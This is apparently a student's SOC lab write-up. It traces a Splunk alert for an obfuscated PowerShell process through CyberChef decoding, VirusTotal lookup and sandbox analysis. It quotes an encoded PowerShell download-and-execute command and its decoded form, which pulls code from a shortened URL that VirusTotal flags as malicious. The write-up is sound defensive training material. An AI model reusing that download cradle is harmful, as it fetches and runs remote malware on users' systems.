<h1>SOC-Lab-Incident-report </h1>

 

<h2>Introduction/Description</h2>
This project consists of a virtual lab SOC event simulation that I created. For this lab I was presented with log data that would purposly triger an alert on the SIEM tool(Splunk) that was running on my network. With the snapshots of data and tools that i used to investigate this alert. I will walk you through my thought process of how I triaged this whole event. 
<br />


<h2>Languages and Utilities Used</h2>

- <b>PowerShell</b> 
- <b>Splunk</b>
- <b>Linux VM</b>
- <b>Windows sandbox vm</b>
- <b>ANY.RUN(Sand Box Tool)</b>
- <b>Virus Total</b>
- <b>Cyber Chef</b>
<h2>Environments Used </h2>

- <b>Windows 7 sandbox VM</b>
- <b>Linux VM </b> 


<h2>Program walk-through:</h2>

<p align="center">
Splunk event alert : <br/>
<img src="https://i.imgur.com/TtKAjut.png height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br /> As shown in the splunk window, this is the event for the alert that we received in splunk. The alert the I received was for an execution of a process that is Obfuscated. In the splunk event viewer you can see the information provided such as time and date of the event, event Id, name of the user, username login of the user, type of ingested log data and more. 
<br />
Splunk event alert :  <br/>
<img src="https://i.imgur.com/258BqEd.png height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
As you scroll down in the event viewer window in splunk you are given more information about the event. Here you can see the process information such as the "Creator process name"= C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe and the "Process Command line": "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYgBpAHQALgBsAHkALwBlADAATQB3ADkAdwAiACkA. This obfuscated command line is what caused our alert in splunk and is what we are going to be investigating. 
<br />
Cyber Chef: <br/>
<img src="https://imgur.com/YPxZFGM.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br /> As you take a look at the process command line you can see that it obfuscated. After .exe which is the execute process you can see that it has -enc to encode the actual execution. So to see what the process command line is trying to do we need to decode it to see if it is malicious. As you can see I used a decryption tool called cyber chef. The output result I would get would be "iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")" which basically directs a user to the specified URL listed and allows them to download contents of the listed URL. 

<br />
Virus Total report:  <br/>
<img src="https://i.imgur.com/TalzEiR.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br /> 
As we continue with this investigation we can already see that this is suspicious activity. First the process command line was Obfuscated and Second we found out that execution of the process command line leads the user to URL which allows them to download unknown files. The next step in our investigation is to check and see if the website from the process is malicious or not. I did this with a tool called Virus total. The results would confirm that the website is indeed malicious. It has a score of 11/90. Which shows that 11 security vendors marked this domain as malicous.
<br />
: Incident Report <br/>
<img src="https://imgur.com/3D2toHo.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Sand box results :  <br/>
<img src="https://imgur.com/xHssB4C.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br />
<br />
Sand Box threat Results:  <br/>
<img src="https://imgur.com/LxViLQq.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
</p>

<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
--!>
